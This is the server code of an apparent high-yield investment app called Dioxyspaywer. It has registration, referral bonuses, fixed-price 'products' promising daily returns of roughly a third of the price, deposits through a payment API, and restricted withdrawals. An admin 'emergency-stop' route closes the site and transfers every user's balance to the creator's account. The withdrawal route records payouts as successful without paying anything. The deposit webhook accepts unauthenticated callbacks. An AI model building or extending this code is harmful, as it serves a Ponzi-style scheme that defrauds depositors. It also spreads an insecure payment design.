require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const axios = require('axios');
const path = require('path');

const User = require('./models/User');
const Transaction = require('./models/Transaction');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let isSiteActive = true;

mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log('✅ MongoDB Connecté'))
    .catch(err => {
        console.error('❌ Erreur MongoDB:', err);
        process.exit(1);
    });

const authMiddleware = async (req, res, next) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Accès refusé' });
    
    try {
        const decoded = jwt.verify(token.split(' ')[1], process.env.JWT_SECRET);
        req.user = await User.findById(decoded.id);
        if (!req.user) return res.status(404).json({ error: 'Utilisateur introuvable' });
        if (!req.user.isActive && req.user.phone !== process.env.CREATOR_WALLET_PHONE) {
            return res.status(403).json({ error: 'Compte désactivé.' });
        }
        next();
    } catch (e) {
        return res.status(401).json({ error: 'Token invalide' });
    }
};

app.get('/api/status', (req, res) => res.json({ active: isSiteActive }));

// Inscription
app.post('/api/register', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    try {
        const { fullName, phone, country, password, referralCode } = req.body;
        if (!fullName || !phone || !password) return res.status(400).json({ error: 'Champs manquants' });
        
        const exist = await User.findOne({ phone });
        if (exist) return res.status(400).json({ error: 'Numéro déjà utilisé' });

        const hashedPassword = await bcrypt.hash(password, 10);
        let role = (phone === process.env.CREATOR_WALLET_PHONE) ? 'admin' : 'user';
        
        let referredByUserId = null;
        let sponsor = null;

        if (referralCode && referralCode.trim() !== '') {
            sponsor = await User.findOne({ referralCode: referralCode.trim() });
            if (sponsor) {
                referredByUserId = sponsor._id;
                sponsor.balance += 50;
                sponsor.referralCount += 1;
                sponsor.referralEarnings += 50;
                await sponsor.save();
                
                await Transaction.create({
                    userId: sponsor._id,
                    type: 'REFERRAL_BONUS',
                    amount: 50,
                    method: 'Parrainage',
                    status: 'SUCCESS',
                    reference: `REF_${Date.now()}`
                });
            }
        }
        
        await User.create({ fullName, phone, country, password: hashedPassword, role, referredBy: referredByUserId });
        res.json({ success: true, message: 'Inscription réussie' });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur serveur inscription' });
    }
});

// Connexion
app.post('/api/login', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    try {
        const { phone, password } = req.body;
        const user = await User.findOne({ phone });
        if (!user || !(await bcrypt.compare(password, user.password))) {
            return res.status(400).json({ error: 'Identifiants incorrects' });
        }

        const currentMonth = new Date().toISOString().slice(0, 7);
        // Réinitialisation automatique si on change de mois
        if (user.lastPurchaseMonth !== currentMonth) {
            user.monthlyPurchasesCount = 0;
            user.lastPurchaseMonth = currentMonth;
            user.lastPurchaseDate = null; // Reset de la date aussi
            await user.save();
        }

        const now = new Date();
        let needsSave = false;

        // 1. Calcul Long Terme (85 jours)
        if (user.hasLongTerm && user.longTermStartDate) {
            const startDate = new Date(user.longTermStartDate);
            const daysPassed = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
            const maxDays = 85;
            
            const daysToCount = daysPassed > maxDays ? maxDays : (daysPassed < 0 ? 0 : daysPassed);
            const expectedTotalGains = daysToCount * 700;
            
            if ((user.longTermAccumulatedGains || 0) < expectedTotalGains) {
                user.longTermAccumulatedGains = expectedTotalGains;
                needsSave = true;
            }

            if (daysPassed >= maxDays && !user.longTermFinished) {
                user.withdrawalBalance = (user.withdrawalBalance || 0) + user.longTermAccumulatedGains;
                
                await Transaction.create({ 
                    userId: user._id, 
                    type: 'GAIN', 
                    amount: user.longTermAccumulatedGains, 
                    status: 'SUCCESS', 
                    reference: `LT_END_${Date.now()}`,
                    description: 'Fin Long Terme (Transfert)' 
                });
                
                user.longTermAccumulatedGains = 0;
                user.longTermFinished = true;
                needsSave = true;
            }
        }

        // 2. Calcul Courts Termes
        if (user.shortTermProducts && user.shortTermProducts.length > 0) {
            const activeProducts = [];
            for (let prod of user.shortTermProducts) {
                const startDate = new Date(prod.startDate);
                const unlockDate = new Date(prod.unlockDate);
                let daysElapsed = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
                if (daysElapsed > 5) daysElapsed = 5;
                if (daysElapsed < 0) daysElapsed = 0;

                const expectedTotalGains = daysElapsed * prod.dailyGain;
                if ((prod.accumulatedGains || 0) < expectedTotalGains) {
                    prod.accumulatedGains = expectedTotalGains;
                    needsSave = true;
                }

                if (unlockDate <= now) {
                    if (prod.accumulatedGains > 0) {
                        user.withdrawalBalance = (user.withdrawalBalance || 0) + prod.accumulatedGains;
                        
                        await Transaction.create({ 
                            userId: user._id, 
                            type: 'GAIN', 
                            amount: prod.accumulatedGains, 
                            status: 'SUCCESS', 
                            reference: `CT_END_${Date.now()}`, 
                            description: `Fin ${prod.type} (Transfert)` 
                        });
                        
                        prod.accumulatedGains = 0;
                    }
                } else {
                    activeProducts.push(prod);
                }
            }
            user.shortTermProducts = activeProducts;
        }

        if (needsSave) await user.save();

        const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '24h' });
        const transactions = await Transaction.find({ userId: user._id }).sort({ date: -1 }).limit(50);

        res.json({ 
            token, role: user.role, balance: user.balance, depositBalance: user.balance,
            withdrawalBalance: user.withdrawalBalance || 0,
            hasLongTerm: user.hasLongTerm, 
            longTermStartDate: user.longTermStartDate,
            longTermAccumulatedGains: user.longTermAccumulatedGains || 0,
            fullName: user.fullName, phone: user.phone, country: user.country,
            monthlyPurchasesCount: user.monthlyPurchasesCount || 0,
            remainingPurchases: 2 - (user.monthlyPurchasesCount || 0),
            shortTermProducts: user.shortTermProducts || [],
            referralCode: user.referralCode, referralCount: user.referralCount || 0,
            referralEarnings: user.referralEarnings || 0,
            transactions: transactions
        });
    } catch (e) {
        console.error("Erreur Login:", e);
        res.status(500).json({ error: 'Erreur serveur login' });
    }
});

// Investissement (MODIFIÉ AVEC LA RÈGLE DES 7 JOURS)
app.post('/api/invest', authMiddleware, async (req, res) => {
    try {
        const { productType, amount } = req.body;
        const user = req.user;
        
        if (user.balance < amount) return res.status(400).json({ error: 'Solde insuffisant dans le dépôt.' });
        
        // Logique spécifique aux produits courts termes
        if (productType.startsWith('prod')) { 
            if (!user.hasLongTerm || user.longTermFinished) {
                return res.status(403).json({ error: 'Produit Long Terme obligatoire et actif.' });
            }

            const currentMonth = new Date().toISOString().slice(0, 7); // Ex: "2026-05"
            
            // 1. Réinitialisation si on change de mois
            if (user.lastPurchaseMonth !== currentMonth) { 
                user.monthlyPurchasesCount = 0; 
                user.lastPurchaseMonth = currentMonth; 
                user.lastPurchaseDate = null; // On reset la date aussi
            }

            // 2. Vérification de la limite de 2 achats
            if (user.monthlyPurchasesCount >= 2) {
                return res.status(403).json({ error: 'Limite de 2 achats/mois atteinte.' });
            }

            // 3. ✅ NOUVELLE RÈGLE : Vérification du délai de 7 jours
            // Si l'utilisateur a déjà fait au moins 1 achat ce mois-ci ET qu'on a une date enregistrée
            if (user.monthlyPurchasesCount >= 1 && user.lastPurchaseDate) {
                const now = new Date();
                const lastBuy = new Date(user.lastPurchaseDate);
                
                // Calcul de la différence en millisecondes
                const diffTime = Math.abs(now - lastBuy);
                // Conversion en jours (24h * 60min * 60sec * 1000ms)
                const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24)); 

                // Si moins de 7 jours se sont écoulés
                if (diffDays < 7) {
                    const daysLeft = 7 - diffDays;
                    return res.status(403).json({ 
                        error: `Vous devez attendre encore ${daysLeft} jour(s) avant votre prochain achat.` 
                    });
                }
            }
        }

        user.balance -= amount;
        let dailyGain = 0;
        const now = new Date();

        if (productType === 'longterm') {
            if (user.hasLongTerm) return res.status(400).json({ error: 'Déjà un produit Long Terme actif.' });
            if (amount !== 2500) return res.status(400).json({ error: 'Prix incorrect.' });
            
            user.hasLongTerm = true;
            user.longTermStartDate = now;
            user.longTermAccumulatedGains = 0;
            user.longTermFinished = false;
        } else {
            // Configuration des produits courts termes
            if (productType === 'prod1') { if (amount !== 2000) throw new Error('Prix P1'); dailyGain = 750; }
            else if (productType === 'prod2') { if (amount !== 3000) throw new Error('Prix P2'); dailyGain = 1000; }
            else if (productType === 'prod3') { if (amount !== 5000) throw new Error('Prix P3'); dailyGain = 1700; }
            else if (productType === 'prod4') { if (amount !== 10000) throw new Error('Prix P4'); dailyGain = 3000; }
            else if (productType === 'prod5') { if (amount !== 15000) throw new Error('Prix P5'); dailyGain = 4800; }
            else if (productType === 'prod6') { if (amount !== 20000) throw new Error('Prix P6'); dailyGain = 6500; }
            else if (productType === 'prod7') { if (amount !== 30000) throw new Error('Prix P7'); dailyGain = 9500; }
            else if (productType === 'prod8') { if (amount !== 40000) throw new Error('Prix P8'); dailyGain = 12000; }
            else throw new Error('Produit inconnu');

            const unlockDate = new Date(); 
            unlockDate.setDate(unlockDate.getDate() + 5);
            
            if (!user.shortTermProducts) user.shortTermProducts = [];
            user.shortTermProducts.push({ 
                type: productType, amount, dailyGain, startDate: now, unlockDate, accumulatedGains: 0 
            });
            
            // Incrémentation du compteur
            user.monthlyPurchasesCount += 1;
            
            // ✅ MISE À JOUR DE LA DATE DU DERNIER ACHAT
            user.lastPurchaseDate = now; 
        }
        
        await user.save();
        await Transaction.create({ userId: user._id, type: 'INVESTMENT', amount, status: 'SUCCESS', reference: `INV_${Date.now()}` });
        
        res.json({ success: true, newBalance: user.balance, remainingPurchases: 2 - user.monthlyPurchasesCount });
    } catch (e) {
        console.error(e);
        res.status(400).json({ error: e.message || 'Erreur investissement' });
    }
});

// --- DÉPÔT SENDAVAPAY ---
app.post('/api/deposit', authMiddleware, async (req, res) => {
    const { amount, network, phone } = req.body; 
    if (amount < 2000) return res.status(400).json({ error: 'Minimum 2000 FCFA' });
    
    try {
        const user = req.user;
        const internalRef = `DXP_${Date.now()}`; 
        
        const postData = {
            amount: parseInt(amount),
            currency: "XOF",
            description: `Dépôt Dioxyspaywer - ${user.fullName}`,
            customerPhone: phone,
            customerName: user.fullName,
            externalReference: internalRef,
            redirectUrl: process.env.SENDAVA_RETURN_URL || 'https://dioxyspaywer.onrender.com'
        };

        const SENDAVA_API_URL = 'https://sendavapay.com/api/v1/create-payment';

        const response = await axios.post(SENDAVA_API_URL, postData, {
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${process.env.SENDAVA_API_KEY}`
            }
        });
        
        if (response.data && response.data.success) {
            const paymentData = response.data.data;
            
            await Transaction.create({ 
                userId: user._id, 
                type: 'DEPOSIT', 
                amount: amount, 
                method: network, 
                status: 'PENDING', 
                reference: internalRef,
                sendavaReference: paymentData.reference
            });
            
            res.json({ 
                success: true, 
                paymentUrl: paymentData.paymentUrl,
                sendavaReference: paymentData.reference
            });
        } else {
            res.status(400).json({ error: 'Erreur création paiement Sendavapay.' });
        }
    } catch (error) {
        console.error("Erreur Sendavapay:", error.response ? error.response.data : error.message);
        res.status(500).json({ error: 'Erreur connexion Sendavapay.' });
    }
});

// --- WEBHOOK SENDAVAPAY ---
app.post('/api/webhook/deposit', async (req, res) => {
    try {
        const data = req.body;
        
        if (data.status === 'completed' || (data.event && data.event.includes('payment.completed'))) {
            
            const sendavaRef = data.reference;
            const amount = parseFloat(data.amount);
            
            const transaction = await Transaction.findOne({ 
                $or: [
                    { sendavaReference: sendavaRef },
                    { reference: sendavaRef }
                ]
            });
            
            if (transaction && transaction.status === 'PENDING') {
                transaction.status = 'SUCCESS';
                await transaction.save();
                
                const user = await User.findById(transaction.userId);
                if (user) {
                    user.balance += amount;
                    await user.save();
                    console.log(`💰 Dépôt Sendavapay confirmé : ${amount} FCFA pour ${user.phone}`);
                }
            }
        }
        res.status(200).send("OK");
    } catch (e) {
        console.error("Erreur Webhook:", e);
        res.status(500).send("Error");
    }
});

// Retrait
app.post('/api/withdraw', authMiddleware, async (req, res) => {
    try {
        const { amount, network, phone } = req.body;
        const user = req.user;
        const now = new Date();
        
        if (amount < 1000) return res.status(400).json({ error: 'Min 1000 FCFA' });
        if ([0, 6].includes(now.getDay())) return res.status(403).json({ error: 'Pas de retrait Week-end.' });
        if (now.getHours() < 8 || now.getHours() >= 21) return res.status(403).json({ error: 'Hors horaires (08h-21h).' });
        if (user.lastWithdrawDate && user.lastWithdrawDate.toDateString() === now.toDateString()) return res.status(403).json({ error: '1 retrait/jour.' });

        if (amount > (user.withdrawalBalance || 0)) {
            return res.status(400).json({ error: `Solde insuffisant RETRAITE. Dispo: ${user.withdrawalBalance || 0} FCFA` });
        }

        user.withdrawalBalance -= amount;
        user.lastWithdrawDate = now;
        await user.save();
        
        await Transaction.create({ userId: user._id, type: 'WITHDRAWAL', amount, method: network, status: 'SUCCESS', reference: `W_${Date.now()}` });
        res.json({ success: true, message: 'Retrait envoyé.' });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur retrait' });
    }
});

// Admin Dashboard
app.get('/api/admin/dashboard', authMiddleware, async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
    const users = await User.find();
    const totalVault = users.reduce((a, b) => a + b.balance + (b.withdrawalBalance||0), 0);
    res.json({ users, totalVault });
});

// Historique Complet des Transactions (Admin)
app.get('/api/admin/transactions', authMiddleware, async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) {
        return res.status(403).json({ error: 'Accès réservé au créateur.' });
    }

    try {
        const transactions = await Transaction.find()
            .sort({ date: -1 })
            .limit(100) 
            .populate('userId', 'fullName phone');

        const formattedTransactions = transactions.map(tx => ({
            id: tx._id,
            userPhone: tx.userId ? tx.userId.phone : 'Inconnu',
            userName: tx.userId ? tx.userId.fullName : 'Inconnu',
            type: tx.type,
            amount: tx.amount,
            method: tx.method || '-',
            status: tx.status,
            date: tx.date,
            reference: tx.reference
        }));

        res.json({ success: true, transactions: formattedTransactions });
    } catch (e) {
        console.error("Erreur récupération transactions admin:", e);
        res.status(500).json({ error: 'Erreur serveur lors de la récupération de l\'historique.' });
    }
});

// Urgence Stop
app.post('/api/admin/emergency-stop', authMiddleware, async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
    isSiteActive = false;
    try {
        const creatorPhone = process.env.CREATOR_WALLET_PHONE;
        let creator = await User.findOne({ phone: creatorPhone }) || await User.create({ fullName:'Admin', phone:creatorPhone, country:'Togo', password:'x', role:'admin', balance:0 });
        const others = await User.find({ _id: { $ne: creator._id } });
        let seized = 0;
        for(let u of others) { 
            if(u.balance>0){ seized+=u.balance; u.balance=0; u.isActive=false; await u.save(); } 
            if(u.withdrawalBalance>0){ seized+=u.withdrawalBalance; u.withdrawalBalance=0; await u.save(); }
        }
        creator.balance += seized; await creator.save();
        res.json({ success: true, message: `Site stoppé. ${seized} FCFA récupérés.` });
    } catch (error) { res.status(500).json({ error: 'Erreur.' }); }
});

app.listen(PORT, () => console.log(` Serveur Dioxyspaywer démarré sur le port ${PORT}`));
